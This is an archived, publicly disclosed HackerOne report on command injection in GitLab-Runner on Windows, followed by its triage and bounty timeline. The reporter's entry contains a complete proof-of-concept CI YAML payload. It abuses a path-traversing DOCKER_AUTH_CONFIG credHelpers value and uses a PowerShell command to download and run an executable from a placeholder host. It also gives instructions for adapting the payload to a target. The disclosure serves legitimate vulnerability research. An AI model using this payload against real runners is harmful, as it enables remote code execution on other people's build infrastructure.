---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/gitlab
  - os/windows
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
date: 2020-11-04
submitted: 2020-08-10T15:08:42.114Z
bounty_usd: null
votes: 77
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "ajxchapman"
source: "https://hackerone.com/reports/955016"
title: "GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection"
---
# GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 77 | **Program:** GitLab | **Disclosed:** 2020-11-04

- Report: [https://hackerone.com/reports/955016](https://hackerone.com/reports/955016)
- CWE: OS Command Injection
- Submitted: 2020-08-10T15:08:42.114Z

## Timeline

- **Report Filed**
- **2020-08-10** @ajxchapman: Full payload to download and execute an arbitrary program from a webserver (`gitlab-runner` on Windows 2019 with `docker-windows` runner):
```yml
variables:
  DOCKER_AUTH_CONFIG: "{\"credHelpers\" : {\"repo.example.com\" : \"/../../../../../../../../ProgramData/docker/volumes/runner-aapjznsw-project-20444930-concurrent-0-cache-cde2929a41401004cf47d36bdb2eb380/_data/poc.exe\"}}"

services:
  - name: mcr.microsoft.com/windows/servercore:1809
    entrypoint: ["powershell"]
    command: ["Invoke-WebRequest -Uri http://example.com/poc.exe -OutFile c:/builds/poc.exe; sleep 100"]

image: sdfgdsfgsdfgdsfgdsfg:124

build1:
  tags:
    - windows-docker-runner
  stage: build
  script:
    - sleep 200
```

* `aapjznsw` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the runner name, available from the CI/CD settings or build logs.
* `20444930` in `runner-aapjznsw-project-20444930-concurrent` should be replaced with the project ID
* `http://example.com/poc.exe` should be replaced with a URL from which to download a PoC executable.
- **2020-08-10** @gitlab-securitybot: Hi @ajxchapman,

Thank you for submitting this report! We will investigate the issue as soon as
possible, and should get back within a week.

Please do not submit your report or ask about its status through additional
channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-08-12** @ngeorge: @ajxchapman,
Thank you for submitting this report. This issue is now escalated to the engineering team for verification and analysis and is tracked here https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26725. We will get back to you once a feedback is received from the team.

Best Regards,
GitLab Security Team
- **2020-08-20** @ajxchapman: Hi @ngeorge, I've just noticed this bug has not been triaged yet. If you require any further details to help with triage please feel free to reach out.

Thanks,
Alex
- **Report Severity Updated**
- **Report Triaged**
- **2020-08-22** @gitlab-securitybot: ETA for fix:

Hi @ajxchapman,

The issue you reported is currently scheduled to be fixed by 2020-09-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Severity Updated**
- **Report Resolved**
- **2020-10-05** @ajxchapman: Hi @ngeorge, thanks for the update. Would you be able to confirm when this issue will be awarded? As I understand it, the GitLab policy is to award bounties on resolution or 45 days from triage. As it happens both of those conditions were met today.

Thanks,
Alex
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
